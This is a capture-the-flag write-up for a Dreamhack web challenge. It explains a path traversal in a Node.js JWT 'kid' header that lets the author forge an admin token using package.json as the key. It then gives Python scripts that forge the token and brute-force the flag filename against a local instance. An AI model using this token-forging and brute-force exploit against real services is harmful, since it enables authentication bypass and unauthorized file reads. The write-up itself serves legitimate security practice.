[link](https://dreamhack.io/wargame/challenges/905)
    
 - in the `cat.js` fille , there are tow endpont that can be used to get the flag : `/admin` and `/flag`
- to retrieve flag from  endpond `/flag` , the conditon must be satisfied:`req.filename.indexOf(FLAG_FILE_NAME) !== -1` 
- to retrieve flag from endpoint `/admin` , the condition must be satisfiled : `req.username === 'cat_master'`
    
- the `filename` , `usename` properties are assigned throught `Auth`
    
- create jwt token and verify token 
```
const sign = async (filename) => {
    const KEY = fs.readFileSync(PATH_PREFIX + '/' + filename, 'utf-8');
    return jwt.sign({ filename: filename, username: 'dreamhack' }, KEY, { keyid: filename, algorithm: 'HS256' });
}

const verify = (token) => {
    let jwt_data = undefined
    let error = undefined
    jwt.verify(token, (header, cb) => { cb(null, fs.readFileSync(PATH_PREFIX + '/' + header.kid, 'utf-8')); }, { algorithm: 'HS256' }, (err, data) => {

        error = err;
        jwt_data = data;

    }
    )


    return { 'jwt_data': jwt_data, 'err': error };

}
```
    
in the `verify` function has path traveral vulnerability in the `fs.readFileSync()` because `header.kid` can be controlled by users . 
- my initial ideal was to create a jwt token by using the empty secret key while controlling the value of `header.kid` as `../../../../.../dev/null` . However , i receive an error because the singing process requires a non-empty secret key . Therefore , i decided to use the value of `package.json` file as the secret key .

script:
```
import jwt  


with open("package.json", "r", encoding="utf-8") as f:
    SECRET_KEY = f.read()

#  denifine header 
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../package.json"  
    # Lưu ý: Từ thư mục '/home/cat/deploy/keys', chỉ cần lùi 1 cấp '../package.json' 
    # là đã ra tới thư mục '/home/cat/deploy/' chứa file package.json trên server rồi bạn nhé!
}
# denifile  Payload
payload = {
    "filename": "arbitrary",
    "username": "cat_master"
}

# sign 
token = jwt.encode(payload, SECRET_KEY, algorithm="HS256", headers=header)

print("[+] JWT TOKEN ")
print(token)

```
    
- payload :![image](https://hackmd.io/_uploads/HJIr8zUJzg.png)

- in the `entrypoint.sh
```
file has code snippet `FLAG=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 2 | head -n 1)

mv /home/cat/deploy/flag.txt /home/cat/deploy/flag$FLAG.txt
```
it indicate that the filename format as `flag$FLAG.txt` . `$FLAG` has a length of two and both characters are hexadecimal characters . 
- script:
```
import requests
import jwt
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==============================================================================
#                   (CONFIGURATION)
# ==============================================================================
TARGET_HOST = "http://localhost:3000"  
ENDPOINT_FLAG = "/cat/flag"               


MAX_THREADS = 20                       


PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


SECRET_FILE_PATH = "package.json"


SERVER_KID_PATH = "../package.json"

requests.packages.urllib3.disable_warnings()


try:
    with open(SECRET_FILE_PATH, "r", encoding="utf-8") as f:
        SECRET_KEY = f.read()
except FileNotFoundError:
    print(f"[-] ERRER : NOT FOUND '{SECRET_FILE_PATH}' ")
    exit(1)


def check_filename(hex_suffix):
    predicted_filename = f"flag{hex_suffix}.txt"
    print(f"[*] TRY filename: {predicted_filename}")
    
    header = {
        "alg": "HS256",
        "typ": "JWT",
        "kid": SERVER_KID_PATH
    }
    
    payload = {
        "filename": predicted_filename,
        "username": "cat_master"
    }
    
    token = jwt.encode(payload, SECRET_KEY, algorithm="HS256", headers=header)
    
    
    cookies = {"session": token} 
    
    try:
        response = requests.get(
            f"{TARGET_HOST}{ENDPOINT_FLAG}", 
            cookies=cookies, 
            proxies=PROXIES, 
            verify=False, 
            timeout=5
        )
        
        if response.status_code == 200:
            return {
                "success": True, 
                "filename": predicted_filename, 
                "content_1": response.text,
                "cookies": cookies
            }
    except requests.exceptions.RequestException:
        pass
        
    return {"success": False}

def main():
    hex_chars = "0123456789abcdef"
    tasks = [f"{c1}{c2}" for c1 in hex_chars for c2 in hex_chars]
    
    print(f"[*] Target Host: {TARGET_HOST}")
    print(f"[*] Proxy Config: {PROXIES}")
    print(f"[*] Brute Force with {MAX_THREADS} ..")
    print("-" * 50)

    found = False
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        
        future_to_hex = {executor.submit(check_filename, suffix): suffix for suffix in tasks}
        
        for future in as_completed(future_to_hex):
            result = future.result()
            if result["success"]:
                found = True
                print("\n" + "="*50)
                print(f"[+] SUCCESSFULL  ! file flag : {result['filename']}")
                print(f"[+] RESULT (FLAG_CONTENT_1): {result['content_1']}")
                print("="*50)
                print("="*50 + "\n")
                
               
                executor.shutdown(wait=False, cancel_futures=True)
                break
                
    if not found:
        print("\n[-] NOT FOUND")

if __name__ == "__main__":
    main()

```
![image](https://hackmd.io/_uploads/rJTTZ7Ukfl.png)
![image](https://hackmd.io/_uploads/HJfkGXI1Mx.png)